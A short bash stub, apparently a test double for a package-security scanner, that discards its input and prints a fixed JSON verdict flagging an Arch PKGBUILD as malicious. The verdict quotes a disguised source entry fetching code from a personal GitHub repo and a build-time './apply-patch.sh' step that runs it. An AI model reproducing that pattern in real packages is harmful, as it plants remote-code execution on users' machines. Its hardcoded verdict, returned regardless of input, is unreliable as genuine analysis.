#!/bin/bash
cat > /dev/null
echo '{"verdict":"MALICIOUS","confidence":95,"summary":"A source labelled patches points at a personal GitHub repo unrelated to Firefox and is executed during build — the July 2025 CHAOS RAT vector.","findings":[{"file":"PKGBUILD","severity":"critical","quote":"patches::git+https://github.com/danikpapas/zenbrowser-patch.git","why":"Disguised source entry pulls attacker-controlled code instead of genuine upstream."},{"file":"PKGBUILD","severity":"critical","quote":"./apply-patch.sh","why":"Executes the fetched attacker code at build time."}]}'
